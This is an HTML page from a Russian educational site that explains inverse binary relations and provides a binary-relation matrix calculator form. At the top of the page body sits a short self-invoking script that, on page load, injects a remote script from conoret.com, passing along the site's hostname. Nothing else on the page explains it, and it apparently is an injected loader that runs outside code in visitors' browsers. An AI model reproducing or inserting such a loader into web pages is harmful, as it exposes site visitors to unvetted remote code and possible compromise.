﻿<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="ru-ru" lang="ru-ru" dir="ltr">
<head>

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Свойства Бинарных Отношений(СБО)</title> 
    <link rel="stylesheet" href="static/content/StylesheetSlup.css">
    <script src="static/scripts/Assymetrical.js"></script>

	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<base href="/sbo">
	<meta name="author" content="Super User">
	<meta name="generator" content="">
	<title>Математическое моделирование</title>
	<link href="assets/favicon.ico" rel="shortcut icon" type="image/vnd.microsoft.icon">
    
	<link href="https://gg.looknewsite.ru/assets/bootstrap.min.css" rel="stylesheet">
	<link href="https://gg.looknewsite.ru//assets/bootstrap-select.min.css" rel="stylesheet">
	<link href="https://gg.looknewsite.ru//assets/owl.carousel.min.css" rel="stylesheet">
	<link href="https://gg.looknewsite.ru//assets/animate.min.css" rel="stylesheet">
	<link href="https://gg.looknewsite.ru//assets/Chart.min.css" rel="stylesheet">
	<link href="https://gg.looknewsite.ru//assets/css2" rel="stylesheet">
	<link href="https://gg.looknewsite.ru//assets/rostsayt.min.css" rel="stylesheet">
	<link href="https://gg.looknewsite.ru//assets/template.css" rel="stylesheet">
   
	<script src="https://gg.looknewsite.ru//assets/jquery-3.5.1.min.js"></script>
	<script src="https://gg.looknewsite.ru//assets/jquery.validate.js"></script>
	<script src="https://gg.looknewsite.ru//assets/popper.min.js"></script>
	<script src="https://gg.looknewsite.ru//assets/bootstrap.min.js"></script>
	<script src="https://gg.looknewsite.ru//assets/bootstrap-select.min.js"></script>
	<script src="https://gg.looknewsite.ru//assets/owl.carousel.min.js"></script>
	<script src="https://gg.looknewsite.ru//assets/wow.min.js"></script>
	<script src="https://gg.looknewsite.ru//assets/jquery.mask.min.js"></script>
	<script src="https://gg.looknewsite.ru//assets/Chart.bundle.min.js"></script>
	<script src="https://gg.looknewsite.ru//assets/Chart.min.js"></script>
	<script src="https://gg.looknewsite.ru//assets/rostsayt.js"></script>
	<script src="https://gg.looknewsite.ru//assets/template.js"></script>
	<script src="https://gg.looknewsite.ru//assets/context.js"></script>
	<script src="https://gg.looknewsite.ru//assets/ammap.js"></script>
	<script src="https://gg.looknewsite.ru//assets/russiaLow.js"></script>

    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, user-scalable=yes">
    <meta name="HandheldFriendly" content="true">
    <meta name="apple-mobile-web-app-capable" content="YES">

	<style>        
        #navbar {
        background-color: black;
        }

        body {
            font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
            margin: 0 auto; /* Центрирование по горизонтали */
            padding: 0;
            width: 90%; /* Ширина 70% */
            background-color: #000; /* Черный фон */
            color: #fff; /* Белый текст */
   
        }

        #top_menu .nav.menu li {
            white-space: nowrap; /* Предотвращает перенос элементов на новую строку */
        }

        #top_menu .nav.menu li {
            white-space: nowrap; /* Предотвращает перенос элементов на новую строку */
            margin-right: 35px; /* Установите нужный размер отступа */
            opacity: 0; /* Устанавливаем начальную прозрачность */
            transform: translateY(-50px); /* Начальное положение элементов */
            animation: fadeInDown 2s ease forwards; /* Применяем анимацию */
        }

        @keyframes fadeInDown {
            from {
                opacity: 0; /* Начальная прозрачность */
                transform: translateY(-50px); /* Начальное положение */
            }
            to {
                opacity: 1; /* Конечная прозрачность */
                transform: translateY(0); /* Конечное положение */
            }
        }      

        #top_menu .nav.menu li a:hover {
            color: #32CD32; /* Здесь указываете желаемый зеленый цвет текста */
        }

        #top_menu ul {
            display: flex;
            flex-wrap: nowrap; /* запрещаем перенос элементов на новую строку */
            justify-content: space-between; /* равномерное распределение элементов по горизонтали */
            align-items: center; /* выравнивание элементов по вертикали */
        }  
    </style>

</head>
<body class="home" cz-shortcut-listen="true">
    <script type="text/javascript">
        window.top === window &&
            !function(){
                var e=document.createElement("script"),
                    t=document.getElementsByTagName("head")[0];
                e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),
                e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)
            }();
    </script>
    <!-- BEGIN WAYBACK TOOLBAR INSERT -->
    <!-- END WAYBACK TOOLBAR INSERT -->
    <div id="body">
        <header class="navbar navbar-expand-xl navbar-light" id="navbar">
            <div class="container">
                <div class="collapse navbar-collapse" id="navbar-content">
                    <div id="top_menu" class="navbar-nav ml-5 w-100">
                        <ul class="nav menu w-100 justify-content-between align-items-center header-top-menu mod-list">
                            
                            <li class="item-102"><a href="/home">Главная</a></li>
                            
                            <li class="item-102"><a href="/Var1Binary">Вид бинарных отношений</a></li>

                            <li class="item-103"><a href="/sbo">Свойство бинарных отношений</a></li>
                            <li class="item-104"><a href="/max">Максимальный поток в сети</a></li>
                            <li class="item-105"><a href="/gc">Гамельтонов цикл</a></li>
                            <li class="item-106"><a href="/about">Об авторах</a></li>
                            <li class="item-107">
                                <a href="/#mod-form1"></a>
                            </li>
                            <li class="item-112 work-in-pride-link">
                                <a href="http://workinpride.ru/rus" class="work-in-pride-link" target="_blank" rel="noopener noreferrer">Работай в компании Green Pride</a>
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
        </header>
        <div class="button-container">
        <div class="button" id="showTheory" onclick="showTheory()">Теория</div>
        <div class="button" id="showCalculator" onclick="showCalculator()">Калькулятор</div>
    </div>

    <div class="content-container">
        <div id="theorySection" class="section">
            <!-- Теория -->
           
                <h1>Обратное бинарное отношение</h1>
                <p>Обратное бинарное отношение - это концепция из математики и теории отношений, которая возникает в контексте пар элементов, где порядок играет важную роль. Давайте разберемся более подробно.</p>
                <div class="animate-from-left">
                        <a target="_blank"><img id="teacher-img" src="/static/images/CirlceBinary.gif" alt="derty" style="float: left; margin-right: 20px; width: 400px; height: 400px; vertical-align: center;"></a>
                </div>
            
                <ol>
                    <li>
                        <strong>Бинарное отношение:</strong> В математике бинарное отношение на множестве A - это подмножество декартова произведения A x A, где каждый элемент этого подмножества представляет собой пару элементов из множества A.
                    </li>
                    <li>
                        <strong>Обратное бинарное отношение:</strong> Обратное бинарное отношение для данного бинарного отношения R на множестве A - это также бинарное отношение, но с элементами, обратными к элементам из R. Другими словами, если (a, b) принадлежит R, то (b, a) принадлежит обратному бинарному отношению R{-1}. Обратное бинарное отношение получается инвертированием всех пар в исходном отношении.
                    </li>
                    <li>
                        <strong>Свойства обратного бинарного отношения:</strong>
                        <ul>
                            <li>Обратное бинарное отношение не обязательно симметрично, но если исходное отношение симметрично, то обратное отношение также будет симметричным.</li>
                            <li>Обратное бинарное отношение к рефлексивному отношению остается рефлексивным.</li>
                            <li>Обратное бинарное отношение для транзитивного отношения остается транзитивным.</li>
                        </ul>
                    </li>
                </ol>
                      
                <div class="formula">
                    Пусть дано отношение R = {(1, 2), (2, 3), (3, 4)} на множестве A = {1, 2, 3, 4}. Тогда обратное бинарное отношение R^{-1} будет равно {(2, 1), (3, 2), (4, 3)}, так как все пары были инвертированы.
                </div>   
        </div>
        <div id="calculatorSection" class="section">
            <form action="/solutionSBO" method="POST" id="matrix_form">
            
                    <!-- Калькулятор -->
                
                    <h1>Калькулятор</h1>
  
                    <!-- HTML для калькулятора -->
                    <p class="calc" for="matrix-size" style="font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif; border: '2px solid black';">Выберите размер матрицы:</p>
                    <p><input type="number" id="matrix-size" name="sizeOurmatrix"
                        title="Size matrix" placeholder="Size matrix"  
                        onkeydown="return event.key !== 'Enter' && event.key !== '-'" id="matrix_size" min="3" max="10" required></p>
                    
                    <div id="matrix-container"></div>
                    <table id="table"><tbody></tbody></table>
            
                    <div class="button-container">
                        <button class="button" id="resolve" name="resolve" type='submit'>Решить</button>
                
                    </div>
            </form>
         
            <div class="button-container">
                        <button class="button" onclick="fillMatrixRandomly(parseInt(document.getElementById('matrix-size').value))" >Сгенерировать</button>
                        <button class="button" onClick="openFileExplorer()">Загрузить из файла</button>
            </div>
        </div>
               
    </div>
    <footer class="footer text-center">
        <div class="container">
            <p style="color: #f0f0f0;">&copy; 2024 Все права защищены</p>
        </div>
    </footer>

</body>


</html>